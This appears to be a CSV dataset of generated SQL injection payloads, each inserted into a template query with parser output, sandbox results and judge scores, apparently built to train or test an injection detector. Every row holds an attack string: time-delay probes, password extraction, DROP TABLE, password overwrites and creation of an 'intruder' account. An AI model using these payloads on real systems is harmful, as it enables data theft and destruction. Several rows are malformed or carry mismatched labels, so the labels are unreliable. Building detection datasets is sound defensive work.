query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00659,"1' AND TIME_TO_SEC(TIMEDIFF(NOW(),(SELECT NOW() FROM users WHERE id=SLEEP(5)))) > 0 --","SELECT * FROM users WHERE id = 1' AND TIME_TO_SEC(TIMEDIFF(NOW(),(SELECT NOW() FROM users WHERE id=SLEEP(5)))) > 0 --",blind_time,user_lookup,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""GT"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00661,1' AND CAST(NULL AS CHAR) LIKE '%' COLLATE utf8mb4_bin AND SLEEP(5) --,SELECT * FROM users WHERE id = 1' AND CAST(NULL AS CHAR) LIKE '%' COLLATE utf8mb4_bin AND SLEEP(5) --,blind_time,user_lookup,1,0,0.0,True,default,"[""Like"", ""Anonymous"", ""DataType"", ""From"", ""Collate"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Null"", ""Star"", ""Table"", ""Var"", ""Select"", ""Cast"", ""Where"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00662,"1' AND (SELECT CONCAT('X', IF(SLEEP(5), 'Z', 'W')) FROM users WHERE id=1) --","SELECT * FROM users WHERE id = 1' AND (SELECT CONCAT('X', IF(SLEEP(5), 'Z', 'W')) FROM users WHERE id=1) --",blind_time,user_lookup,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Concat"", ""If"", ""Select"", ""Where"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00663,"1' AND TIME_TO_SEC(TIMEDIFF(NOW(), (SELECT IF(SLEEP(5), NOW(), NULL) FROM users))) > 0 --","SELECT * FROM users WHERE id = 1' AND TIME_TO_SEC(TIMEDIFF(NOW(), (SELECT IF(SLEEP(5), NOW(), NULL) FROM users))) > 0 --",blind_time,user_lookup,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Null"", ""Star"", ""Table"", ""If"", ""Select"", ""GT"", ""Where"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00664,1' AND (SELECT CAST(CURRENT_TIMESTAMP AS CHAR) FROM users WHERE id=(CASE WHEN (SLEEP(5)=SLEEP(5)) THEN CURRENT_TIMESTAMP ELSE '0' END)) --,SELECT * FROM users WHERE id = 1' AND (SELECT CAST(CURRENT_TIMESTAMP AS CHAR) FROM users WHERE id=(CASE WHEN (SLEEP(5)=SLEEP(5)) THEN CURRENT_TIMESTAMP ELSE '0' END)) --,blind_time,user_lookup,1,0,0.0,True,default,"[""Paren"", ""Anonymous"", ""DataType"", ""CurrentTimestamp"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Case"", ""If"", ""Select"", ""Cast"", ""Where"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00665,"1' AND ASCII(SUBSTRING((SELECT username FROM users ORDER BY id LIMIT 1 OFFSET 0 FOR UPDATE), 1, 1)) > 64 AND SLEEP(5) --","SELECT * FROM users WHERE id = 1' AND ASCII(SUBSTRING((SELECT username FROM users ORDER BY id LIMIT 1 OFFSET 0 FOR UPDATE), 1, 1)) > 64 AND SLEEP(5) --",blind_time,user_lookup,1,0,0.0,True,default,"[""And"", ""Limit"", ""GT"", ""Lock"", ""Ordered"", ""Ascii"", ""Anonymous"", ""Offset"", ""Table"", ""Order"", ""Subquery"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Where"", ""Select"", ""Substring"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00666,--' AND (SELECT 1 FROM (SELECT sleep(5) AS s FROM information_schema.tables WHERE table_name='users' LIMIT 1) AS t) --,SELECT * FROM users WHERE id = --' AND (SELECT 1 FROM (SELECT sleep(5) AS s FROM information_schema.tables WHERE table_name='users' LIMIT 1) AS t) --,blind_time,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00667,' OR (SELECT 1 AS x FROM users WHERE username != '' HAVING COUNT(*) > (SELECT 0 AS y FROM (SELECT sleep(5) AS z FROM users WHERE id=-1) AS w)) --,SELECT * FROM users WHERE id = ' OR (SELECT 1 AS x FROM users WHERE username != '' HAVING COUNT(*) > (SELECT 0 AS y FROM (SELECT sleep(5) AS z FROM users WHERE id=-1) AS w)) --,blind_time,user_lookup,1,0,0.0,True,default,"[""Alias"", ""GT"", ""Or"", ""Anonymous"", ""Neg"", ""TableAlias"", ""Table"", ""Subquery"", ""Having"", ""From"", ""Column"", ""Star"", ""Count"", ""EQ"", ""Literal"", ""NEQ"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00669,' OR SLEEP(5),SELECT * FROM orders WHERE status = '' OR SLEEP(5)' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Or"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00671,"'; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOe', 5); IF @x IS NOT NULL THEN WAITFOR DELAY '0:0:10'","SELECT * FROM orders WHERE status = ''; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOe', 5); IF @x IS NOT NULL THEN WAITFOR DELAY '0:0:10'' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,postgres,"[""Anonymous"", ""Parameter"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Set"", ""Table"", ""Var"", ""Dot"", ""Select"", ""SetItem"", ""Command"", ""Where"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00672,' OR (SELECT SLEEP(5))--,SELECT * FROM orders WHERE status = '' OR (SELECT SLEEP(5))--' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Or"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00673,"' OR 'a'='a' AND BENCHMARK(1000000, SHA1('random'))--","SELECT * FROM orders WHERE status = '' OR 'a'='a' AND BENCHMARK(1000000, SHA1('random'))--' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Or"", ""SHA"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00675,' OR '1'='1' AND (SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema=database())--,SELECT * FROM orders WHERE status = '' OR '1'='1' AND (SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema=database())--' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,mysql,"[""Like"", ""From"", ""CurrentSchema"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Or"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00677,--' AND SLEEP(5) --,SELECT * FROM orders WHERE status = '--' AND SLEEP(5) --' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00678,"' OR (SELECT BENCHMARK(1000000, SHA1('test'))) --","SELECT * FROM orders WHERE status = '' OR (SELECT BENCHMARK(1000000, SHA1('test'))) --' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Subquery"", ""Table"", ""Where"", ""Select"", ""Or"", ""SHA"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00679,"' OR 1=1 AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0) --","SELECT * FROM orders WHERE status = '' OR 1=1 AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0) --' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""If"", ""Select"", ""Identifier"", ""Or"", ""Exists""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00680,"' AND IF(4747=4747,SLEEP(5),NULL)--","INSERT INTO comments (user_id, body) VALUES (1, '' AND IF(4747=4747,SLEEP(5),NULL)--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Null"", ""Star"", ""Table"", ""If"", ""Select"", ""Where"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00681,-- OR '1'='1'; WAITFOR DELAY '0:0:5' --,"INSERT INTO comments (user_id, body) VALUES (1, '-- OR '1'='1'; WAITFOR DELAY '0:0:5' --')",blind_time,comment_insert,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00682,"'""; DECLARE @a INT; SET @a=@@VERSION; IF(@a LIKE'%Microsoft%') PRINT('Vulnerable'); ELSE PRINT('Safe');--","INSERT INTO comments (user_id, body) VALUES (1, ''""; DECLARE @a INT; SET @a=@@VERSION; IF(@a LIKE'%Microsoft%') PRINT('Vulnerable'); ELSE PRINT('Safe');--')",blind_time,comment_insert,1,0,0.0,True,tsql,"[""Block"", ""Var"", ""Command"", ""Like"", ""Parameter"", ""Table"", ""Set"", ""SetItem"", ""Declare"", ""Semicolon"", ""DataType"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Where"", ""Select"", ""IfBlock"", ""DeclareItem"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00683,"' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=HASHBYTES('SHA1','password'))--","INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=HASHBYTES('SHA1','password'))--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Identifier"", ""Or"", ""Exists""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00684,' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username=CHAR(97) AND password=CHAR(100))>0--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username=CHAR(97) AND password=CHAR(100))>0--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Chr"", ""From"", ""Column"", ""And"", ""Count"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""GT"", ""Or"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00685,' OR '1'='1' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR '1'='1' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Length"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""GT"", ""Or"", ""Subquery"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00686,"'; BENCHMARK(1000000,CRC32(RAND()));--","INSERT INTO comments (user_id, body) VALUES (1, ''; BENCHMARK(1000000,CRC32(RAND()));--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Anonymous"", ""Semicolon"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Rand"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00687,"' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 100--","INSERT INTO comments (user_id, body) VALUES (1, '' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 100--')",blind_time,comment_insert,1,0,0.0,True,mysql,"[""From"", ""Substring"", ""CurrentSchema"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Select"", ""GT"", ""Or"", ""Ascii"", ""Subquery"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00689,"[""1'; DROP TABLE users; --""","SELECT * FROM users WHERE username = '[""1'; DROP TABLE users; --""' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""Semicolon"", ""From"", ""Column"", ""Star"", ""EQ"", ""Drop"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00690,1; EXEC('CREATE USER intruder WITH PASSWORD 123'); --,SELECT * FROM users WHERE username = '1; EXEC('CREATE USER intruder WITH PASSWORD 123'); --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Literal"", ""Anonymous"", ""Semicolon""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00691,1'; (SELECT pg_sleep(5)); --,SELECT * FROM users WHERE username = '1'; (SELECT pg_sleep(5)); --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Anonymous"", ""Semicolon"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Subquery"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00693,1' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%users%')--,SELECT * FROM users WHERE username = '1' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%users%')--' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Like"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Identifier"", ""Exists""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00694,1'; UPDATE users SET password='hacked' WHERE username='admin'; --,SELECT * FROM users WHERE username = '1'; UPDATE users SET password='hacked' WHERE username='admin'; --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon"", ""Update"", ""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00695,"1' UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%'), NULL --","SELECT * FROM users WHERE username = '1' UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%'), NULL --' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""Like"", ""From"", ""Column"", ""Star"", ""EQ"", ""Count"", ""Literal"", ""Null"", ""Table"", ""Union"", ""Select"", ""Where"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00696,1'; --; SELECT * FROM users WHERE username = 'admin' AND password = '' /*,SELECT * FROM users WHERE username = '1'; --; SELECT * FROM users WHERE username = 'admin' AND password = '' /*' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon"", ""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00697,1' ;/* */ DROP TABLE users ; --,SELECT * FROM users WHERE username = '1' ;/* */ DROP TABLE users ; --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon"", ""From"", ""Column"", ""Star"", ""EQ"", ""Drop"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00698,1'; END IF; DROP TABLE users; --,SELECT * FROM users WHERE username = '1'; END IF; DROP TABLE users; --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon"", ""Alias"", ""From"", ""Column"", ""Star"", ""EQ"", ""Drop"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00699,1' AND 1=1; SELECT * FROM users WHERE username = 'admin' AND password = (CHAR(84)||CHAR(104)||CHAR(97)||CHAR(100)); --,SELECT * FROM users WHERE username = '1' AND 1=1; SELECT * FROM users WHERE username = 'admin' AND password = (CHAR(84)||CHAR(104)||CHAR(97)||CHAR(100)); --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Paren"", ""Semicolon"", ""Chr"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""DPipe"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00700,"--
SELECT * FROM users WHERE username = 'admin' AND '1'='1'","SELECT * FROM products WHERE name LIKE '%--
SELECT * FROM users WHERE username = 'admin' AND '1'='1'%'",stacked_queries,search,1,0,0.0,True,default,"[""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00701,'; UPDATE products SET price=0 WHERE id=1; --,SELECT * FROM products WHERE name LIKE '%'; UPDATE products SET price=0 WHERE id=1; --%',stacked_queries,search,1,0,0.0,True,default,"[""Semicolon"", ""Update"", ""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00702,' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE 'products%') --,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE 'products%') --%',stacked_queries,search,1,0,0.0,True,default,"[""Like"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Exists"", ""Select"", ""Or"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00703,'; DROP TABLE IF EXISTS products; --,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE IF EXISTS products; --%',stacked_queries,search,1,0,0.0,True,default,"[""Semicolon"", ""From"", ""Column"", ""Star"", ""EQ"", ""Drop"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00705,'; EXECUTE IMMEDIATE 'DROP TABLE products''; --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE IMMEDIATE 'DROP TABLE products''; --%',stacked_queries,search,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Command"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00706,"[""'; DROP TABLE products; --"", ""; INSERT INTO orders (product_id, quantity) VALUES (1, 100); --"", "" OR (	SELECT 1 FROM dual ); --"", ""; UPDATE prices SET discount = 10 WHERE product_id = 1; --"", "" UNION ALL SELECT NULL, NULL, NULL, NULL FROM admin""]","SELECT * FROM products WHERE name LIKE '%[""'; DROP TABLE products; --"", ""; INSERT INTO orders (product_id, quantity) VALUES (1, 100); --"", "" OR (	SELECT 1 FROM dual ); --"", ""; UPDATE prices SET discount = 10 WHERE product_id = 1; --"", "" UNION ALL SELECT NULL, NULL, NULL, NULL FROM admin""]%'",stacked_queries,search,1,0,0.0,True,default,"[""Array"", ""Identifier"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00707,"UNION SELECT NULL,NULL,'admin',NULL--""","SELECT * FROM users WHERE id = UNION SELECT NULL,NULL,'admin',NULL--""",stacked_queries,user_lookup,1,0,0.0,True,default,"[""From"", ""Star"", ""Table"", ""Literal"", ""EQ"", ""Null"", ""Union"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00708,' AND 1=1; SELECT * FROM another_table --,SELECT * FROM users WHERE id = ' AND 1=1; SELECT * FROM another_table --,stacked_queries,user_lookup,1,0,0.0,True,default,"[""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00710,' AND (SELECT 1 WHERE 1=1); --,SELECT * FROM users WHERE id = ' AND (SELECT 1 WHERE 1=1); --,stacked_queries,user_lookup,1,0,0.0,True,default,"[""Semicolon"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Subquery"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00711,--'; DROP TABLE IF EXISTS users; --,SELECT * FROM users WHERE id = --'; DROP TABLE IF EXISTS users; --,stacked_queries,user_lookup,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00712,' AND 2+2=4; DROP DATABASE users;,SELECT * FROM users WHERE id = ' AND 2+2=4; DROP DATABASE users;,stacked_queries,user_lookup,1,0,0.0,True,default,"[""Select"", ""From"", ""Column"", ""And"", ""EQ"", ""Drop"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Add"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00713,1' UNION ALL SELECT * FROM information_schema.users WHERE password<>''--,SELECT * FROM users WHERE id = 1' UNION ALL SELECT * FROM information_schema.users WHERE password<>''--,stacked_queries,user_lookup,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""NEQ"", ""Table"", ""Union"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00714,' OR (SELECT 1 FROM users WHERE username='' AND password=''),SELECT * FROM users WHERE id = ' OR (SELECT 1 FROM users WHERE username='' AND password=''),stacked_queries,user_lookup,1,0,0.0,True,default,"[""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Or"", ""Subquery"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00715,'); UPDATE orders SET status='shipped' WHERE user_id=1; --,SELECT * FROM orders WHERE status = ''); UPDATE orders SET status='shipped' WHERE user_id=1; --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Paren"", ""Semicolon"", ""Update"", ""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00716,'); DELETE FROM sessions WHERE session_id LIKE '%admin%'; --,SELECT * FROM orders WHERE status = ''); DELETE FROM sessions WHERE session_id LIKE '%admin%'; --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Like"", ""Paren"", ""Semicolon"", ""Delete"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00717,'); CREATE VIEW hidden_orders AS SELECT * FROM orders WHERE user_id<0; --,SELECT * FROM orders WHERE status = ''); CREATE VIEW hidden_orders AS SELECT * FROM orders WHERE user_id<0; --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Paren"", ""Semicolon"", ""From"", ""Create"", ""Column"", ""LT"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
